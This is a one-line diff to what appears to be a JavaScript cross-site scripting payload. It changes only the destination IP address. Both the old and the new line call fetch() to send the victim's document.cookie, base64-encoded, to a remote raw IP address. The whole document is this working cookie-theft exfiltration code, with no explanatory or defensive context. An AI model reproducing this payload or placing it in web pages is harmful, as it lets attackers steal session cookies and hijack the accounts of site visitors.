@@ -1,1 +1,1 @@
-fetch('http://3.140.192.12/?c='+btoa(document.cookie));
+fetch('http://18.117.121.232/?c='+btoa(document.cookie));
